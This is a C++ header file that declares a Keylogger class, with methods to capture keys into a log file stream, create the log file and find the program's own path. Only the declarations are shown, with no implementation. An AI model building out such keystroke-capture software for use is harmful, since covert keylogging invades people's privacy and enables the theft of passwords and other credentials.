#pragma once

#include <string>

#define FILEEXT ".log"
#define DEBUG
//#define DEBUG_TO_LOGS

class Keylogger
{
private:
	std::string intToString(int);
	std::string getSelfPath();
	std::string dirBasename(std::string);

public:	
	void get_key(std::ofstream &file_logs);
	std::string create_file();
};
